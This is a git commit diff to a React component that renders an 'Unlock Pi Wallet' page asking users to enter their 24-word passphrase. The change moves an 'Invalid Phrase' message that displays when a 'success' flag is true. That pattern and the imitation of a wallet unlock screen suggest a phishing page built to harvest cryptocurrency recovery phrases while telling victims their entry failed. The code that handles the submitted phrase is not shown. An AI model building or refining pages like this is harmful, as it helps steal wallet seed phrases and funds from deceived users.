bbb66b381ab78e4cfb8e9838795eb0f491bcacad
pirender <renderpi52@gmail.com>
2024-08-11 01:27:02 +0100

    'test'

--- src/components/Wallet/Wallet.tsx
+++ src/components/Wallet/Wallet.tsx
@@ -54,23 +54,11 @@ const Wallet = () => {
       <div className="navCon mx-auto my-0 px-3">
         <div className="flex flex-col gap-6">
           <div>
-            {success ? (
-              <div className="transition-all ease-in-out border-2 flex items-center justify-center gap-3 rounded-[5px] font-[700] text-[#292B2C] border-[black] text-center py-8">
-                Invalid Phrase
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  viewBox="0 0 24 24"
-                  fill="black"
-                  className="w-[20] h-[20px]"
-                >
-                  <path d="M11.9997 10.5865L16.9495 5.63672L18.3637 7.05093L13.4139 12.0007L18.3637 16.9504L16.9495 18.3646L11.9997 13.4149L7.04996 18.3646L5.63574 16.9504L10.5855 12.0007L5.63574 7.05093L7.04996 5.63672L11.9997 10.5865Z"></path>
-                </svg>
-              </div>
-            ) : (
-              <h2 className="text-center text-[17px] leading-[25.5px] text-[#292B2C] font-[700]">
-                Unlock Pi Wallet
-              </h2>
-            )}
+
+            <h2 className="text-center text-[17px] leading-[25.5px] text-[#292B2C] font-[700]">
+              Unlock Pi Wallet
+            </h2>
+
           </div>
 
           <form onSubmit={handleSubmit} className=" flex flex-col gap-4">
@@ -81,10 +69,15 @@ const Wallet = () => {
                 id=""
                 rows={9}
                 placeholder="Enter your 24-word passphrase here"
-                className={`border border-[#fab44b] placeholder:font-[500] rounded-[3px] my-0 w-[95%] px-3 pt-3 sm:w-full bg-[#fafafa] focus:outline-none ${
-                  border && "border-red-500"
-                }`}
+                className={`border border-[#fab44b] placeholder:font-[500] rounded-[3px] my-0 w-[95%] px-3 pt-3 sm:w-full bg-[#fafafa] focus:outline-none ${border && "border-red-500"
+                  }`}
               ></textarea>
+            </div>
+
+            <div>
+              {success && <p className="text-center text-red-500">
+                Invalid Phrase
+              </p>}
             </div>
 
             <div className="flex items-center justify-center">
